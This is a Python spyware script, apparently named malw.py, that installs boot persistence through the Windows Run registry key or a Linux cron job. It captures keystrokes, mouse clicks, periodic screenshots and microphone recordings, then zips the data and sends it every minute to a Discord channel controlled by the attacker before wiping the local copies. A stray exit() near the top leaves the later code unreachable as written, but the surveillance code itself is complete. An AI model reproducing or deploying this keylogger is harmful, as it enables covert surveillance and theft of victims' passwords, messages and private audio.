import cv2
import keyboard
import datetime
import pyautogui
import threading
from time import sleep
import os
from pynput import keyboard, mouse
import pyaudio
import wave
# from discord import client
from discord import Client, message, Intents, File
from discord.ext import tasks
import shutil #to zip the data folder
import zipfile
import platform
from crontab import CronTab


CURRENT_PATH = os.path.abspath(__file__).replace("malw.py","")

# Discord Config

TOKEN = ""
CHANNEL_ID = ""
# if TOKEN =="":
#     raise Exception("Discord token not set! Please add the your discord token first by setting the variable <TOKEN> (string type)")
# if CHANNEL_ID=="":
#     raise Exception("Channel ID not set! Please add the your channel id first by setting the variable <CHANNEL_ID> (int type)")    

def OS_Detection():
    OS = platform.system()
    
    regKeyName = "PROGRAMM"
    if OS=="Windows":
        import winreg
        #Check if registry key is already set
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            winreg.QueryValueEx(key, regKeyName)
        #Registry key not set
        except FileNotFoundError:
            #Create key in registry
            #Key is the pythonw.exe executable followed by the current python file
            base = CURRENT_PATH.split("\\")
            base = base[0]+"\\"+base[1]+"\\"+base[2]+"\\"
            pythonExecPath = base  + "AppData\Local\Microsoft\WindowsApps\pythonw.exe"
            value = pythonExecPath + " "+CURRENT_PATH+"\\malw.py"
            
            #Create the key
            key =  winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            winreg.SetValueEx(key, regKeyName, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)
            
    elif OS == "Linux": 
        # Works on Ubuntu 22.04.2 LTS
        # Creates a cronjob that executes this python script on boot
        # Requires root permission
        currentUser = os.getlogin()
        # Can also set root as user but requires sudo privileges
        cron = CronTab(user = currentUser)
        
        # Check if cronjob is already set
        jobs = cron.find_command("")
        command = "python3 "+CURRENT_PATH+"malw.py"
        # Search for the command in the cronjobs
        set = False
        for job in jobs:
            if job.command==command:
                print("FOUND")
                set = True
                break
        if not set:
            job = cron.new(command=command)
            job.every_reboot()
            cron.write()
        
OS_Detection()

exit()
###############START#FACE#DETECTION################

# faceCascade = cv2.CascadeClassifier("./haarcascade_frontalface_default.xml")
# video_capture = cv2.VideoCapture(0)

# while True:
#     # Capture frame-by-frame
#     ret, frame = video_capture.read()

#     gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)

#     faces = faceCascade.detectMultiScale(
#         gray,
#         scaleFactor=1.1,
#         minNeighbors=5,
#         minSize=(30, 30),
#         flags=cv2.CASCADE_SCALE_IMAGE
#     )

#     # Draw a rectangle around the faces
#     if(len(faces)!=0):
#         print("FACE DETECTED! ")
#         break
# # When everything is done, release the capture
# video_capture.release()
# cv2.destroyAllWindows()

###############END#FACEDE#TECTION################



def logEvent(event, value=None):
    dateTime =  str(datetime.datetime.now().date()) + " "+datetime.datetime.now().strftime("%H:%M:%S")+": "
    if(event=="keyPress"):
        path = CURRENT_PATH+"data/keyboard.log"
    elif(event=="scr"):
        path = CURRENT_PATH+"data/scr.log"
        absPath = os.path.abspath(value)
        value = "Screenshot taken stored at "+absPath
    elif(event=="mouseClick"):
        path = CURRENT_PATH+"data/mouse.log"
    print(value)
    
    with open(path, "a") as logFile:
        logFile.write(dateTime+str(value)+"\n")
    
# This function takes a screenshot every 15 seconds and
# stores the screenshot at ./screenshot.log
def takeScreenshots():
    i = 1
    while True:
        screenshot = pyautogui.screenshot()
        scrPath = CURRENT_PATH+"data/screenshots/"+str(i)+".png"
        screenshot.save(scrPath)  
        logEvent("scr", scrPath)
        i+=1
        sleep(15)   
        
    
# This function logs every pressed key and stores it
# at its logfile .logs/keyboard.log

def keyLog():
    def on_press(key):
        logEvent("keyPress", str(key))
        print(key)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
 
#This function logs the coordinates of each click and takes
# a screenshot everytime the mouse is clicked           
def mouseLog():
    def on_click(x, y, button, pressed):
        if(pressed):
            logEvent("mouseClick", str(x)+", "+str(y))
            screenshot = pyautogui.screenshot()
            scrPath = CURRENT_PATH+"data/screenshots/click"+str(datetime.datetime.now().date()) + "_"+str(datetime.datetime.now().strftime("%H.%M.%S"))+".png"
            screenshot.save(scrPath)  
            
    with mouse.Listener(on_click=on_click, ) as listener:
        listener.join()
            

#This function records every 15 seconds sound from the mic
#in chunks of 5 seconds
def record():
    j=1
    while True:        
        audio = pyaudio.PyAudio()

        # Get the device information
        device_info = audio.get_device_info_by_index(1)
        device_name = device_info['name']
        print(f"Recording from device: {device_name}")

        stream = audio.open(format=pyaudio.paInt16,
                            channels=1,
                            rate=44100,
                            input=True,
                            frames_per_buffer=1024,
                            input_device_index=1)

        frames = []

        print("Start sound record")
        for i in range(0, int(44100 / 1024 * 5)):
            data = stream.read(1024)
            frames.append(data)
        print("End sound record")

        stream.stop_stream()
        stream.close()
        audio.terminate()

        output_file = CURRENT_PATH+"data/recordings/soundRecording"+str(j)+".wav"
        print(output_file)
        wave_file = wave.open(output_file, 'wb')
        wave_file.setnchannels(1)
        wave_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wave_file.setframerate(44100)
        wave_file.writeframes(b''.join(frames))
        wave_file.close()
        j+=1
        sleep(15)


thread1 = threading.Thread(target=keyLog)
thread2 = threading.Thread(target=mouseLog)
thread3 = threading.Thread(target=takeScreenshots)
thread4 = threading.Thread(target=record)

thread1.start()
thread2.start()
thread3.start()
thread4.start()

#Deletes all data in the data folder
def clearData():
    # path = os.path.abspath("./data")
    shutil.rmtree(CURRENT_PATH+'data')
    os.mkdir(CURRENT_PATH+"data")
    os.mkdir(CURRENT_PATH+"data/recordings")
    os.mkdir(CURRENT_PATH+"data/screenshots")
    open(CURRENT_PATH+"data/keyboard.log","w").close()
    open(CURRENT_PATH+"data/mouse.log","w").close()
    open(CURRENT_PATH+"data/scr.log","w").close()

def compress_dir():
    print("Compress")
    output = CURRENT_PATH+"data.zip"
    input = CURRENT_PATH+"data"
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zipFile:
        for root, _, files in os.walk(input):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, input)
                zipFile.write(file_path, arcname)
    

Intent = Intents.default()
Intent.message_content = True

bot = Client(intents= Intent)
    
@tasks.loop(seconds=60)
async def sendMsg(channel):

    #Compress the data folder to data.zip
    print("TESTTT")
    compress_dir()
    print("SEND")
    with open(CURRENT_PATH+"data.zip", "rb") as fp:
        await channel.send(file= File(fp))
        clearData()
        

@bot.event
async def on_ready():
    channel= bot.get_channel(CHANNEL_ID)
    await sendMsg.start(channel)

bot.run(TOKEN)


